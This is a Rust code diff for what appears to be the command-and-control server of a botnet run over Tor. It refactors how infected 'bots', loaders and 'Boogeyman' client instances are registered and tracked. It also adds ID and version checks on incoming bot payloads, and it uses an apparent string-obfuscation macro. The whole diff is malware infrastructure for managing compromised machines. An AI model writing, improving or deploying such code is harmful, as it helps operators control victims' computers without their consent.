@@ -1,5 +1,6 @@
 use std::collections::HashMap;
 use std::net::SocketAddr;
+use chrono::Utc;
 use client_vars::types::receive::BoogeymanReceivePayload;
 use client_vars::types::send::BoogeymanSendPayload;
 use loader_vars::types::receive::LoaderReceivePayload;
@@ -24,30 +25,48 @@ use std::sync::Arc;
 use client_vars::types::structs::BotState;
 use super::client::route_client;
 use super::loader::route_loader;
+use super::sanitization::verify_id_and_version;
 
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct ClientBot {
-    pub id: String,
+pub struct ClientInstance {
     pub join_date: String,
     pub version: u64,
     pub bot_state: BotState,
     pub console: String,
 }
 #[derive(Serialize, Deserialize, Debug, Clone)]
-pub struct LoaderBot {
-    pub id: String,
+pub struct LoaderInstance {
     pub join_date: String,
     pub version: u64,
+    pub tag: String,
 }
-// device id >> version >> bot
-pub type LoaderBotMap = Arc<RwLock<HashMap<String, Arc<RwLock<HashMap<u64, LoaderBot>>>>>>;
-pub type ClientBotMap = Arc<RwLock<HashMap<String, Arc<RwLock<HashMap<u64, ClientBot>>>>>>;
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct Bot {
+    pub id: String,
+    pub client_instances: Vec<ClientInstance>,
+    pub loader_instances: Vec<LoaderInstance>,
+    pub verified: bool,
+    pub join_date: String,
+}
+
+impl Bot {
+    pub fn new(id: String) -> Self {
+        Bot {
+            id,
+            client_instances: Vec::new(),
+            loader_instances: Vec::new(),
+            verified: false,
+            join_date: Utc::now().to_string(),
+        }
+    }
+}
+pub type BotMap = HashMap<String, Bot>;
 
 #[derive(Debug, Clone)]
 pub struct TorServerHandler {
     listener: Arc<RwLock<TcpListener>>,
-    pub loader_bot_map: LoaderBotMap,
-    pub client_bot_map: ClientBotMap,
+    pub bot_map: Arc<RwLock<BotMap>>,
 }
 
 impl TorServerHandler {
@@ -58,8 +77,7 @@ impl TorServerHandler {
 
         Ok(TorServerHandler {
             listener: Arc::new(RwLock::new(listener)),
-            loader_bot_map: Arc::new(RwLock::new(HashMap::new())),
-            client_bot_map: Arc::new(RwLock::new(HashMap::new())),
+            bot_map: Arc::new(RwLock::new(HashMap::new())),
         })
     }
     pub async fn listen_for_connections(&mut self) -> Result<()> {
@@ -139,6 +157,7 @@ impl TorServerHandler {
                 let processed_data: LoaderSendPayload = serde_json
                     ::from_slice(&data.data)
                     .context(s!("Failed to parse binary data as LoaderSendPayload").to_string())?;
+                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                 route_loader(self, processed_data, stream_ref).await
             }
             ServerReceiveType::Boogeyman => {
@@ -147,6 +166,7 @@ impl TorServerHandler {
                     .context(
                         s!("Failed to parse binary data as BoogeymanSendPayload").to_string()
                     )?;
+                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                 route_client(self, processed_data, stream_ref).await
             }
         }
